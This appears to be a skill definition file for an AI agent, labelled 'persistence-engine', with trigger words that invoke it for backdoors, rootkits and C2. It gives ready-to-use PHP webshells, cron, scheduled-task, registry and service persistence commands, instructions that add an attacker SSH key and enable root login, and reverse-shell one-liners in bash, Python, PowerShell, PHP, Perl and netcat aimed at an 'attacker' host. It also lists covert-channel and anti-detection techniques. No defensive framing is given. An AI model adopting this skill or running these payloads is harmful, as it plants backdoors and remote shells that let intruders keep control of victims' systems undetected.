---
name: persistence-engine
description: Persistence and backdoor specialist. Use when establishing persistence, creating backdoors, or maintaining access. Triggers on "persist", "backdoor", "rootkit", "c2", "covert", "survive", "reboot".
category: persistence
tags: persistence,backdoor,rootkit,c2,covert,cron,registry,ssh,service
---

# Persistence Engine

## Phase 1: Initial Access Persistence

### Webshell Upload
```php
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['payload']); ?>
<?php system($_REQUEST['cmd']); ?>
```

### Scheduled Tasks
```bash
# Linux cron
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" | crontab -

# Windows Task Scheduler
schtasks /create /tn "SystemUpdate" /tr "cmd.exe /c powershell -ep bypass -enc <BASE64>" /sc daily /st 09:00
```

### Registry Persistence
```bash
# Windows Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "powershell -ep bypass -enc <BASE64>"

# Windows Services
sc create "SystemUpdate" binpath="cmd.exe /c powershell -ep bypass -enc <BASE64>" start=auto
```

### SSH Persistence
```bash
# Add SSH key
echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys

# Modify SSH config
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
systemctl restart sshd
```

## Phase 2: Privilege Escalation Persistence

### SUID Binaries
- Create or modify SUID programs

### Sudo Abuse
- NOPASSWD rules, command aliases

### Kernel Modules
- Rootkit installation

### Service Manipulation
- Create/modify Windows services

### DLL Hijacking
- Replace legitimate DLLs

### COM Object Hijacking
- Modify COM registrations

## Phase 3: Covert Channels

### DNS Tunneling
- Data exfiltration via DNS queries

### ICMP Tunneling
- Data in ping packets

### HTTP Covert Channels
- Steganography in images

### Encrypted Channels
- Reverse shells over TLS

### Domain Fronting
- Use CDN for C2 traffic

### Steganography
- Hide data in files

## Phase 4: Anti-Detection

### Fileless Persistence
- Memory-only backdoors

### Living-off-the-Land
- Use legitimate tools

### Encrypted Payloads
- AES/RSA encrypted backdoors

### Polymorphic Code
- Mutate on each execution

### Process Injection
- Hide in legitimate processes

### Rootkit Techniques
- Hide files, processes, connections

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/attacker/4444 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PowerShell
```powershell
powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('attacker',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PHP
```php
php -r '$sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```perl
perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Netcat
```bash
nc -e /bin/sh attacker 4444
```

## Output Format

```
[PERSIST] <persistence type> on <target>
  Method: <technique>
  Trigger: <when it activates>
  Removal: <how to clean up>
```
